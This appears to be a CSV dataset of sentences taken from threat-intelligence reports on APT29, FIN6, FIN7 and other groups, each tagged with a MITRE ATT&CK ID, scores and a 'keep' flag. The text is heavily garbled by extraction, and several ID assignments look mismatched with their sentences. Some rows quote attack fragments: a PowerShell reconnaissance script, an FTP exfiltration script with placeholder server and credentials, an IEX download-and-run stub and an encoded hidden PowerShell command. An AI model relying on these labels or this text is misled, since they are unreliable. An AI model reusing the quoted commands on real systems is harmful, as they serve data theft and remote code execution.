"Assembler 0x29A Micro Backdoor , Miniduke is back: Nemesis Gemina and the Botgen Studio Securelist, July 2014 , CrySyS, July 2014 MiniDuke 2 (CosmicDuke) , FCOSMICDUKE Cosmu with a twist of MiniDuke [pdf] Secure, September 2014 , Leviathan THE CASE OF THE MODIFIED BINARIES Security, October 2014 , Blaze's Security Blog, September A word on CosmicDuke 2014 , F-Secure, OnionDuke: APT Attacks Via the Tor Network November 2014 For more information about MiniDuke, CosmicDuke and OnionDuke, please see References.","S0023","S","0.866202","0.133799","0.866202","0.732403","True","keep"
"This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together.","S0226","S","0.939207","0.060793","0.939207","0.878414","True","keep"
"Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38 ! One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke.","S0396","S","0.705902","0.294098","0.705902","0.411804","True","keep"
"One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together.","S0664","S","0.964066","0.035934","0.964066","0.928132","True","keep"
"Communications with the CozyDuke C2 include key/value pairs passed as URL parameters. The Connections Between MiniDuke, CosmicDuke and OnionDuke , F-Secure, January 2015 Kaspersky Lab products detect the malware used by the CozyDuke threat actor as: The CozyDuke APT APT REPORTS 21 APR 2015 8 minute read ALA // AUTHORS KURT BAUMGARTNER COSTIN RAIU CozyDuke (aka CozyBear, CozyCar or 'O ! ice Monkeys dropper analysis CozyDuke droppers and spyware components often maintain fairly common characteristics, but these # les' functionality are modi # ed in slight ways depending on the team's needs.","S0665","S","0.944009","0.055991","0.944009","0.888018","True","keep"
"It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls.","T0869","T","0.915802","0.084198","0.915802","0.831604","True","keep"
"The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key 'x8BxFFx55x8BxECx83xECx50xA1x84x18x03x68x33xC9x6 6xF7x45x10xE8x1Fx89x45xFCx8Bx45x14x56'.","T0869","T","0.410805","0.589195","0.410805","-0.17839","True","keep"
"It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required)","T1071.005","T","0.924602","0.075398","0.924602","0.849204","True","keep"
"Cache.dll code $ ow overview RC4 decrypt hardcoded c2 and urls resolve hidden function calls collect identifying victim system data encrypt collected data send stolen data to c2 and retrieve commands Cache.dll code details Structurally, 'Cache.dll'","S1105","S","0.953567","0.046433","0.953567","0.907134","True","keep"
"7.txt screenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%.","T1113","T","0.337535","0.662465","0.337535","-0.32493","True","keep"
"The CozyDuke APT APT REPORTS 21 APR 2015 8 minute read ALA // AUTHORS KURT BAUMGARTNER COSTIN RAIU CozyDuke (aka CozyBear, CozyCar or 'O !","S0046","S","0.655804","0.344196","0.655804","0.311608","True","keep"
"It then launches player.exe, a CozyDuke dropper maintaining antidetection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Tr ojan.","S0137","S","0.646147","0.353853","0.646147","0.292294","True","keep"
"Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26 4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat","S0046","S","0.216281","0.783719","0.216281","-0.567438","True","keep"
"Executable-Signing Certi "" cates Samples are usually signed with a fake certi # cate - we've seen two instances, one AMD and one Intel: FROM THE SAME AUTHORS Focus on DroxiDat/SystemBC","T1553.002","T","0.928672","0.071328","0.928672","0.857344","True","keep"
"Con "" guration "" les: Some of the malware uses an encrypted con # guration # le which is stored on disk as 'racss.dat'.","T1027.003","T","0.271526","0.728474","0.271526","-0.456948","True","keep"
"Here's how such a database # le appears: These are BASE64 encoded and use the same RC4 encryption key as the malware con # guration.","S1063","S","0.966016","0.033984","0.966016","0.932032","True","keep"
"Content menu Search... Subscribe The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A","S0051","S","0.363464","0.636536","0.363464","-0.273072","True","keep"
"ADOBE ADOBE PDF DATA ENCRYPTION MINIDUKE OBFUSCATION TARGETED ATTACKS VULNERABILITIES AND EXPLOITS The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor Content menu Search... Subscribe The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A [The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor.","S0023","S","0.909071","0.090929","0.909071","0.818142","True","keep"
"les were rigged with exploits attacking Adobe Reader versions 9, 10 and 11, bypassing its sandbox.","S0432","S","0.945657","0.054343","0.945657","0.891314","True","keep"
"Based on the analysis, it appears that the MiniDuke-s creators provide a dynamic backup system that also can # y under the radar - if Twitter isn-t working or the accounts are down, the malware can use Google Search to !","S0294","S","0.971215","0.028785","0.971215","0.94243","True","keep"
"le, make directory, kill process and of course, download and execute new malware and lateral movement tools.","S0051","S","0.972817","0.027183","0.972817","0.945634","True","keep"
"[The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor.","S0568","S","0.819207","0.180793","0.819207","0.638414","True","keep"
"ADOBE ADOBE PDF DATA ENCRYPTION MINIDUKE OBFUSCATION TARGETED ATTACKS VULNERABILITIES AND EXPLOITS The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor","S0187","S","0.94097","0.05903","0.94097","0.88194","True","keep"
"Coding My Way Out of Here: C2 in Browser Isolation Environments By Mandiant ??? 8-minute read Help Threat Intelligence Seeing Through a GLASSBRIDGE: Understanding the Digital Marketing Ecosystem Spreading Pro-PRC In ! uence Operations By Google Threat Intelligence Group ?? 13-minute read English","T1567.003","T","0.889476","0.110524","0.889476","0.778952","True","keep"
"Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended # le headers used to bypass content inspection made this backdoor di $ cult to identify using typical network monitoring techniques.","T0817","T","0.429002","0.570998","0.429002","-0.141996","True","keep"
"ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim.","T1590.001","T","0.71255","0.28745","0.71255","0.4251","True","keep"
"The WindowsParentalControlsMigration consumer was con # gured to silently execute a base64-encoded PowerShell command. WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the 'CommandLineTemplate.'","T1216.002","T","0.916841","0.083159","0.916841","0.833682","True","keep"
"WMI Filters de # ne conditions that will trigger a Consumer, including system sta % up, the execution of a program, the passing of a speci # ed time and many others.","T1546.003","T","0.729906","0.270094","0.729906","0.459812","True","keep"
"WMI permanent event subscriptions can be used to trigger actions when speci # ed conditions are met.","S0645","S","0.939175","0.060825","0.939175","0.87835","True","keep"
"WMI provides many administrative capabilities on local and remote systems, including querying system information, sta % ing and stopping processes, and se !","S0057","S","0.976612","0.023388","0.976612","0.953224","True","keep"
"As stealthy as POSHSPY can be, it comes to light quickly if you know where to look. Dunwoody Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY. POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI). POSHSPY makes the most of using built-in Windows features - so-called 'living o "" the land' - to make an especially stealthy backdoor. POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI. Threat Intelligence Dissecting One of APT29's Fileless WMI and PowerShell Backdoors (POSHSPY)","S0031","S","0.826848","0.173152","0.826848","0.653696","True","keep"
"The backdoor's infrequent beaconing, tra $ c obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identi # cation of its network tra $ c di $ cult.","T1655.001","T","0.875317","0.124683","0.875317","0.750634","True","keep"
"Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identi # ed through enhanced logging or in memory.","T1564.010","T","0.96208","0.03792","0.96208","0.92416","True","keep"
"POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI. WMI provides many administrative capabilities on local and remote systems, including querying system information, sta % ing and stopping processes, and se ! We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.","T1546.003","T","0.835223","0.164777","0.835223","0.670446","True","keep"
"POSHSPY makes the most of using built-in Windows features - so-called 'living o "" the land' - to make an especially stealthy backdoor.","S0232","S","0.347337","0.652663","0.347337","-0.305326","True","keep"
"Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identi # ed through enhanced logging or in memory. POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI). The WindowsParentalControlsMigration consumer was con # gured to silently execute a base64-encoded PowerShell command.","T1202","T","0.941827","0.058173","0.941827","0.883654","True","keep"
"Dunwoody Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY. Threat Intelligence Dissecting One of APT29's Fileless WMI and PowerShell Backdoors (POSHSPY) We # rst discussed APT29's use of this backdoor as pa % of our 'No Easy Breach' talk. We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.","S0674","S","0.799106","0.200894","0.799106","0.598212","True","keep"
"They also appear to be moving away from their custom tooling, with no Sekur samples compiled since November 2017 and fewer samples appearing in live operations.","S0665","S","0.963388","0.036612","0.963388","0.926776","True","keep"
"PowerShell was also used heavily for the execution of commands and arbitrary script execution.","S0371","S","0.970647","0.029352","0.970647","0.941295","True","keep"
"By supporting malleable communication with the C&C server, it can help attackers blend malicious traffic as legitimate, by allowing them to transform and store data, interpret it backwards, and extract and recover that data from a transaction.","T0869","T","0.957372","0.042628","0.957372","0.914744","True","keep"
"Banks in countries such as Russia, the United Kingdom, the Netherlands, Spain, Romania, Belarus, Poland, Estonia, Bulgaria, Georgia, Moldova, Kyrgyzstan, Armenia, Taiwan and Malaysia have allegedly been targeted with spearphishing emails, luring victims into clicking malicious URLs and executing booby-trapped documents. The initial point of compromise found in our investigation involved the use of spear-phishing emails with malicious URLs and tainted documents rigged to download a Cobalt Strike beacon component. The spear-phishing emails sent to the financial institutions either end up with victims downloading a tampered document meant to download the Cobalt Strike beacon or to exploit several unpatched Remote Code Execution Vulnerabilities and deploy a backdoor.","T0865","T","0.907228","0.092772","0.907228","0.814456","True","keep"
"They were able to maintain a low network footprint and avoid suspicion by using selected single workstations as a hub for centralizing collected information and for communication with their command & control server, outside the regular working hours of the bank.","T0865","T","0.939375","0.060625","0.939375","0.87875","True","keep"
"A carefully executed network reconnaissance and lateral movement plan was unfolding during this time.","T1071.002","T","0.898137","0.101863","0.898137","0.796274","True","keep"
"The system belonged to the adversary and accessed the organization network through a VPN tunnel established by the Cobalt Strike beacon component, to contact the internal corporate network systems.","TA0104","T","0.95553","0.04447","0.95553","0.91106","True","keep"
"In this case, the victim used the Telnet/SSH client PuTTY to connect to the server, and the attackers recompiled the machine's SSH daemon with a backdoor so they could gain direct access.","T1566.001","T","0.801096","0.198904","0.801096","0.602192","True","keep"
"A powershell script (filename: screenshot__.ps1) is created to screenshot victim's desktop.","S0194","S","0.951707","0.048293","0.951707","0.903414","True","keep"
"The Loader VBScript The dropped VBE file is a loader script that drops, installs and executes a second layer VBScript payload in the victim's system.","S0177","S","0.964013","0.035987","0.964013","0.928026","True","keep"
"In short, having gained access, they will jump through the network until they !","S0665","S","0.927895","0.072105","0.927895","0.85579","True","keep"
"More_Eggs Network IOCs In addition to the C2 information provided, which can change, below are some network IOCs that can be used to detect More_Eggs beaconing out of the network:","T1071","T","0.962944","0.037056","0.962944","0.925888","True","keep"
"Web Decoded FTP upload PowerShell script [???] echo 7 echo 7 taskkill /im csrss_tc.exe /f taskkill /im","S0194","S","0.898306","0.101694","0.898306","0.796612","True","keep"
"Get-ChildItem -Path $PathEnum'/c$/Program Files' Get-ChildItem -Path $PathEnum'/c$/Program Files foreach($Directory in Get-ChildItem -Path $PathE foreach($SeachDir in $foldersArr) { Get-ChildItem -Path $PathEnum'/c$/Users/ } } } PowerShell reconnaissance script used to enumerate directories $Dir=""C:/Windows/Temp/"" #ftp server $ftp = ""ftp://<IP Address>/incoming/"" $user = ""<username>"" $pass = ""<password>"" $webclient = New-Object System. } Decoded FTP upload PowerShell script powershell -nop -exec bypass IEX (New-Object Net.","S0371","S","0.941353","0.058647","0.941353","0.882706","True","keep"
"Ib Ic start Ib Imin powershell exe =w hidden encodedcommand JABzADOAIgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEOAZQBtAGSAcgBSAFMA AYQBtACgALABbAEMAbwBuAHYAZQBYAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADY QAcgBpAG4AZwAoACIASAAOAHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBXA EBAQGBSACsATABYAC8AQwBEADUAVwBTAGEAQwBpAFgAdwBuAFoAbwBwAFUAcgBq4","S0371","S","0.307786","0.692214","0.307786","-0.384428","True","keep"
"According to SentinelOne, the threat actor used PowerShell to download and execute a TerraLoader that installed More_eggs. X-Force IRIS has observed ITG08 employ the same tactic whereby it used PowerShell and Windows Management Instrumentation (WMI) to download and execute TerraLoader, then install More_eggs on remote hosts.","T1202","T","0.964285","0.035715","0.964285","0.92857","True","keep"
"Mitigation Tips Effective network defense and threat intelligence rely on multiple factors, such as knowing the network's attack surface, understanding the threat actor's motivations and TTPs, and the skill and knowledge of the security team that enable it to identify malicious behavior.","T0884","T","0.978145","0.021855","0.978145","0.95629","True","keep"
"This loader attempted to masquerade as the Apache Bench application and notably contained metadata and project paths (.PDB), indicating that it may be attempting to masquerade as other applications as well, a rather typical behavior for malicious binaries.","S0177","S","0.959521","0.040479","0.959521","0.919042","True","keep"
"The RC4 key is then used to encrypt data, which is additionally basE91 encoded and sent back to the C&C. BasE91 is a method for encoding binary as ASCII characters.","T1132.001","T","0.243409","0.756591","0.243409","-0.513182","True","keep"
"Over time, they've optimized their tactics culminating in successful breaches of third-party providers such as Inbenta resulting in the theft of Ticketmaster customer data.","S0665","S","0.97526","0.02474","0.97526","0.95052","True","keep"
"Both Palo Alto Networks [ 3] and QuoScient [ 4] have previously described documents created with this kit. Documents from this kit have previously been discussed by Quoscient [ 4 ] . Notably, documents created with this builder use the CMSTP bypass as described in [ 2 ] .","T1071.002","T","0.92357","0.07643","0.92357","0.84714","True","keep"
"Following the RDP connection to systems, FIN6 used two di ff erent techniques to establish a foothold: First technique: FIN6 used PowerShell to execute an encoded command.","S0393","S","0.964607","0.035393","0.964607","0.929214","True","keep"
"In particular, during the reconnaissance phase they gathered information on systems running SQL instances, dumping schemas for multiple databases and SQL user accounts. They likely cracked these hashes outside of the target's network before using multiple sets of domain admin credentials in combination with remote command execution tools such as PsExec and Remote Command Executor (RemCom) throughout the rest of the lateral movement phase.","T1566.003","T","0.919464","0.080536","0.919464","0.838928","True","keep"
"Although Opera is not a fork of Chromium, the newest version has credentials with the same implementation under the path: \Opera Software\Opera Stable\Login Data Stolen Data Command and Control","T1552","T","0.956336","0.043664","0.956336","0.912672","True","keep"
"Figure 17: PowerShell Injected DLL Intelliform Data Stealing 280020h add OFFFEOOICb Btosd stosd Bub eax , loa eax It also contains the reAective DLL injection PowerShell code to inject an information stealing malware variant DLL which will be discussed further.","S0371","S","0.924747","0.075253","0.924747","0.849494","True","keep"
"In the case of these documents it is used to encode JavaScript functionality multiple times, likely in order to avoid common analysis techniques employed by traditional anti-virus software which only emulate JavaScript instructions for a limited amount of iterations.","T1598.002","T","0.975422","0.024578","0.975422","0.950844","True","keep"
"They target very specific industries, hospitality hotels and restaurants - being one of them, and are behind a string of high-profile breaches including Red Robin, Chili's, Arby's, Burgerville, Omni Hotels and Saks Fifth Avenue, among many others.","S0665","S","0.920677","0.079323","0.920677","0.841354","True","keep"
"But this attack, instead of activating hta files (mshta.exe) from within the link, executes obfuscated JavaScript code. By contrast, Morphisec's Moving Target Defensebased technology prevents the attack in its early stages, before any channel to the attacker is opened.","TA0041","T","0.928721","0.071279","0.928721","0.857442","True","keep"
"The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques: Set-Stfictvoje Invcke(Snul] funcrion tncooing 88 SHELLCODE: The shellcode phase of this attack is unique and","S0371","S","0.966032","0.033968","0.966032","0.932064","True","keep"
"They also use AutoIT droppers, password-protected EXE ! They rely on a Gri "" on JS backdoor and Cobalt/Meterpreter, and in recent attacks, Powershell Empire. They thus continue to use e "" ective spearphishing campaigns in Subscribe to our weekly e-mails The hottest research right in your inbox Subscribe Email(Required) dent that they continue to create new personas for use in either targeting or recruiting under a 'new' brand, 'IPC'.","T0865","T","0.932161","0.067839","0.932161","0.864322","True","keep"
"Malicious Documents We have seen two types of documents sent to victims in these spear phishing campaigns.","T1071.002","T","0.910519","0.089481","0.910519","0.821038","True","keep"
"victim to the phishing lure, it would allow FIN7 to increase their foothold within a victim organization's network and potentially pivot to new areas.","T1114","T","0.888733","0.111267","0.888733","0.777466","True","keep"
"Before concluding operations for the day, the adversary would set their callback times to one hour, and change the mode of their communications to use A resource records (instead of TXT records).","S0029","S","0.914488","0.085512","0.914488","0.828976","True","keep"
"During execution, PowerShell would make iterative DNS TXT queries, which would return encrypted data to be concatenated and then executed in memory.","S0371","S","0.966284","0.033716","0.966284","0.932568","True","keep"
"The weaponized PowerShell script was built to load an embedded DLL using reflective injection.","S1024","S","0.95695","0.04305","0.95695","0.9139","True","keep"
"i "" cates in the past to sign their phishing documents, backdoors, and later stage tools.","S0665","S","0.826783","0.173217","0.826783","0.653566","True","keep"
"For example, in April 2017, FireEye blogged about FIN7's spear phishing emails that leveraged hidden sho % cut # les (LNK # les) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim.","T1137.003","T","0.862639","0.137361","0.862639","0.725278","True","keep"
"From there the adversary loads process injection tools or memory scrapers (commonly mimikatz) and pivots using tools like powersploit, RDP services, and PowerAdmin Exec.","TA0104","T","0.965467","0.034533","0.965467","0.930934","True","keep"
"Malicious email Dle The malicious email was sent to the victim via a Microsoft Outlook account with the subject 'ConCrmation Receive Document' with an Excel Cle called 'ConCrmation Receive Document.xls'.","T1566.001","T","0.876395","0.123605","0.876395","0.75279","True","keep"
"ALIVE This state fetches the C&C server, expecting to receive a command from the attackers.","TA0101","T","0.927398","0.072602","0.927398","0.854796","True","keep"
"In May 2017, they expanded their geographical range with hundreds of new attacks targeting several militaries, financial and energy businesses in Europe as well as the United States. They managed to target the victims before Microsoft issued a security update, and organizations rolled out the patch. They tried to deliver a new Trojan called OopsIE, via using a variant of the ThreeDollars delivery document. They use phishing emails to deliver weaponized Microsoft Excel documents, and most of their malware infect the target system with VisualBasic and PowerShell (.ps1) scripts. They were found to be using earlier unseen malware, that uses","T0865","T","0.92236","0.07764","0.92236","0.84472","True","keep"
"No attribution to any known adversary groups was provided, other than that the target radius was primarily in the Middle East and the adversary was also likely operating out of that region.","TA0041","T","0.750152","0.249848","0.750152","0.500304","True","keep"
"The backdoor uses HTTP for C2 communication, with a custom encoding and handshake mechanisms.","T0869","T","0.732847","0.267153","0.732847","0.465694","True","keep"
"Command Request Communication The backdoor contacts the C&C server in the following URL using a GET request: sarmsoftware[.]com/search/{identifier} The response to this request is hidden in the source code of following Flickr lookalike page: 9 Not secure sarmsoftware com /search/","TA0101","T","0.873199","0.126801","0.873199","0.746398","True","keep"
"These backdoor commands are meant to be executed through PowerShell or through the Windows CMD interpreter.","S0371","S","0.966689","0.033311","0.966689","0.933378","True","keep"
"They use spear-phishing attacks with a domain masquerading technique to make the links in their emails appear legitimate.","S0665","S","0.975881","0.024119","0.975881","0.951762","True","keep"
"However, this is a good indicator of the observed activity and may be leveraged to detect this specific sample through host-based indicator checking.","T1630.003","T","0.935874","0.064126","0.935874","0.871748","True","keep"
"Gaining a foothold in the network that had access to numerous components of the ICS while maintaining command and control to Internet locations, positioned it well for espionage.","T1037.003","T","0.964109","0.035891","0.964109","0.928218","True","keep"
"Threat to the Electric Grid Operations In ICS networks though, some of the most concerning issues are related to an adversary's ability to learn the physical process such as the engineering of the systems and their components in how they work together. When used, the adversary can select an arbitrary system service, direct it to refer to CRASHOVERRIDE, and ensure it is loaded on system boot.","S0029","S","0.96064","0.03936","0.96064","0.92128","True","keep"
"T1036: Masquerading On multiple occasions, SandWorm attempted to masquerade their activity through researching and emulating malware used by the Lazarus Group.","S0394","S","0.405183","0.594817","0.405183","-0.189634","True","keep"
"Using legitimate tools like PsExec will save the adversary time from writing their own tooling.","TA0041","T","0.960333","0.039667","0.960333","0.920666","True","keep"
"Stolen Information being exfiltrated to the C&C server.","TA0101","T","0.131748","0.868252","0.131748","-0.736504","True","keep"
"The dropper's goal is to propagate the Hermes executable within a network by creating scheduled tasks over SMB sessions using hard-coded credentials.","T1071.002","T","0.962961","0.037039","0.962961","0.925922","True","keep"
